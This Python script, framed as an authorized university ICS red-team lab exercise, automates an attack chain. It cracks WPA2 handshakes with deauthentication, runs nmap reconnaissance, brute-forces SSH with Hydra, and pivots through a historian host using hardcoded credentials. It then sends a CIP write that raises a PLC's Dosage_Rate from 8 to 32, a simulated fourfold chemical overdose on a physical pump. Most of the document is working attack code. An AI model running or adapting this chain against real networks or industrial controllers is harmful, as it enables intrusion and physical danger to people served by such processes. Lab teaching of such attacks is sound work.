#!/usr/bin/env python3
"""
INCS 4810 Red Team Attack Chain Automation
BCIT SW01-3550 — Authorized Academic Lab Exercise
Instructor: Victor Mendez | Framework: ISA/IEC 62443
"""

import subprocess
import sys
import os
import time
import json
import argparse
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional

# ── Dependency bootstrap ──────────────────────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

rich       = _require("rich")
paramiko   = _require("paramiko")
pycomm3    = _require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.markup import escape
from pycomm3 import LogixDriver

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":     "wlan0",
        "monitor_iface": "wlan0mon",
        "wordlist":      "/usr/share/wordlists/rockyou.txt",
        "capture_file":  "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":   "10.10.10.0/24",
        "ports":         "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "plc": {
        "ip":          "10.20.20.100",
        "tag":         "Dosage_Rate",
        "safe_value":  8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── Helpers ───────────────────────────────────────────────────────────────────
def banner():
    console.print(Panel(
        "[bold red]INCS 4810 — Red Team Attack Chain[/bold red]\n"
        "[dim]BCIT Authorized Lab  |  ISA/IEC 62443  |  Supervisor: Victor Mendez[/dim]\n"
        "[yellow]All actions are authorized and confined to the isolated lab network.[/yellow]",
        expand=False
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green][+][/bold green] {msg}")


def warn(msg: str):
    console.print(f"[bold yellow][!][/bold yellow] {msg}")


def err(msg: str):
    console.print(f"[bold red][-][/bold red] {msg}")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
    """Run a shell command, return (returncode, stdout+stderr)."""
    console.print(f"[dim]$ {cmd}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def confirm_phase(title: str) -> bool:
    return Confirm.ask(f"\n[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)


# ── Phase implementations ─────────────────────────────────────────────────────

def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    bssid   = Prompt.ask("  Enter AP BSSID  (e.g. AA:BB:CC:DD:EE:FF)")
    channel = Prompt.ask("  Enter AP channel (e.g. 6)")
    cap     = CFG["wifi"]["capture_file"]
    iface   = CFG["wifi"]["interface"]
    mon     = CFG["wifi"]["monitor_iface"]
    wl      = CFG["wifi"]["wordlist"]

    ok("Starting monitor mode...")
    run_cmd(f"airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")

    ok(f"Capturing handshake on ch {channel} (60 s)...")
    warn("Run in a second terminal: aireplay-ng --deauth 10 -a " + bssid + " " + mon)
    run_cmd(
        f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
        timeout=75
    )

    ok("Cracking handshake with aircrack-ng...")
    rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)

    if "KEY FOUND" in out:
        key_line = [l for l in out.splitlines() if "KEY FOUND" in l]
        r.finding = key_line[0] if key_line else "KEY FOUND"
        r.status  = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "Handshake not cracked (try larger wordlist)"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (nmap)")
    r = PhaseResult("IDMZ Recon")

    subnet = CFG["nmap"]["idmz_subnet"]
    ports  = CFG["nmap"]["ports"]

    rc, out = run_cmd(f"nmap -sV -p {ports} --open {subnet}", timeout=120)

    historian_found = CFG["historian"]["ip"] in out
    honeypot_found  = CFG["honeypot"]["ip"]  in out

    if historian_found:
        ok(f"Historian found at {CFG['historian']['ip']}")
        r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
        r.status  = "success"
    else:
        warn("Historian not found in scan output — check connectivity")
        r.status  = "failed"

    if honeypot_found:
        warn(f"Cowrie honeypot detected at {CFG['honeypot']['ip']} — DO NOT target this host")

    r.output = out[-2000:]
    return r


def phase3_hydra_brute() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (Hydra)")
    r = PhaseResult("Hydra SSH Brute Force")

    ip = CFG["historian"]["ip"]
    wl = CFG["hydra"]["wordlist"]
    t  = CFG["hydra"]["threads"]
    u  = CFG["historian"]["username"]

    ok(f"Running Hydra against {ip}:22 (user: {u})")
    rc, out = run_cmd(
        f"hydra -l {u} -P {wl} {ip} ssh -t {t} -V -f",
        timeout=300
    )

    if "login:" in out and "password:" in out:
        cred_lines = [l for l in out.splitlines() if "login:" in l and "password:" in l]
        r.finding  = cred_lines[0] if cred_lines else "Credentials found"
        r.status   = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "No credentials found with given wordlist"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian — Lateral Movement Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    ip   = CFG["historian"]["ip"]
    user = CFG["historian"]["username"]
    pwd  = CFG["historian"]["password"]

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=22, username=user, password=pwd, timeout=15)
        ok(f"SSH connected to {ip} as {user}")

        commands = {
            "OT syslog (last 20 lines)": "grep '10.20.20' /var/log/syslog | tail -20",
            "Routes to OT zone":         "ip route | grep 10.20",
            "Ping PLC":                  f"ping -c 3 {CFG['plc']['ip']}",
        }

        findings = []
        for label, cmd in commands.items():
            _, stdout, stderr = client.exec_command(cmd)
            out = stdout.read().decode() + stderr.read().decode()
            console.print(f"\n[bold]{label}:[/bold]")
            console.print(f"[dim]{escape(out)}[/dim]")
            findings.append(f"{label}:\n{out}")

        r.finding = f"OT zone route confirmed; PLC {CFG['plc']['ip']} reachable"
        r.status  = "success"
        r.output  = "\n".join(findings)
        client.close()

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = "SSH auth failed — update CFG with correct credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase5_plc_attack() -> PhaseResult:
    phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
    r = PhaseResult("PLC CIP Write")

    plc_ip    = CFG["plc"]["ip"]
    tag       = CFG["plc"]["tag"]
    safe_val  = CFG["plc"]["safe_value"]
    atk_val   = CFG["plc"]["attack_value"]

    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on {plc_ip}")
    warn("MasterFlex pump will physically change behavior.")

    if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r

    # Run on Historian via SSH so it originates from 10.10.10.20
    payload = (
        f"python3 -c \""
        f"from pycomm3 import LogixDriver; "
        f"plc = LogixDriver('{plc_ip}'); "
        f"plc.open(); "
        f"cur = plc.read('{tag}'); print('Before:', cur.value); "
        f"plc.write(('{tag}', {atk_val})); "
        f"after = plc.read('{tag}'); print('After:', after.value); "
        f"plc.close()\""
    )

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            CFG["historian"]["ip"], port=22,
            username=CFG["historian"]["username"],
            password=CFG["historian"]["password"],
            timeout=15
        )
        ok(f"Connected to Historian; sending CIP Write to {plc_ip}")
        _, stdout, stderr = client.exec_command(payload, timeout=30)
        out  = stdout.read().decode()
        errs = stderr.read().decode()
        client.close()

        console.print(f"[dim]{escape(out)}{escape(errs)}[/dim]")

        if f"After: {atk_val}" in out:
            r.status  = "success"
            r.finding = f"{tag} written: {safe_val} → {atk_val} (4x overdose simulated)"
            ok(r.finding)
        elif "Error" in errs or "Traceback" in errs:
            r.status  = "failed"
            r.finding = errs[:300]
            err(r.finding)
        else:
            r.status  = "success"
            r.finding = f"CIP Write sent; verify on PLC/Grafana. Output: {out[:200]}"
            warn(r.finding)

        r.output = out + errs

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    ok("Checking Suricata alerts on IDS (10.20.20.5)...")
    ids_ip  = "10.20.20.5"
    ids_cmd = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # IDS uses same creds as Historian in this lab
        client.connect(ids_ip, port=22,
                       username=CFG["historian"]["username"],
                       password=CFG["historian"]["password"],
                       timeout=15)
        _, stdout, _ = client.exec_command(ids_cmd)
        out = stdout.read().decode()
        client.close()

        if out.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(out)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"

        r.status = "success"
        r.output = out

    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Report ────────────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold]Attack Chain Report[/bold]")

    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Phase",   style="cyan",  width=28)
    table.add_column("Status",  style="white", width=10)
    table.add_column("Finding", style="white", width=55)

    status_color = {
        "success": "green",
        "failed":  "red",
        "skipped": "yellow",
        "pending": "dim",
    }

    for r in results:
        color = status_color.get(r.status, "white")
        table.add_row(
            r.phase,
            f"[{color}]{r.status.upper()}[/{color}]",
            r.finding
        )

    console.print(table)

    # Save JSON report
    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    ok(f"Full report saved: {report_path}")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",          phase1_wifi_crack),
    (2, "IDMZ Recon",             phase2_idmz_recon),
    (3, "SSH Brute Force",        phase3_hydra_brute),
    (4, "SSH Pivot / OT Recon",   phase4_ssh_pivot),
    (5, "PLC CIP Write Attack",   phase5_plc_attack),
    (6, "Defense Validation",     phase6_defense_check),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab"
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        help="Run specific phases only, e.g. --phases 2 3 4"
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts"
    )
    args = parser.parse_args()

    banner()

    selected = set(args.phases) if args.phases else set(n for n, _, _ in PHASES)

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(f"Phase {n}: {title}"):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        r = fn()
        results.append(r)

        if r.status == "failed" and not args.auto:
            if not Confirm.ask("[red]Phase failed — continue to next phase?[/red]", default=True):
                break

    print_report()


if __name__ == "__main__":
    main()
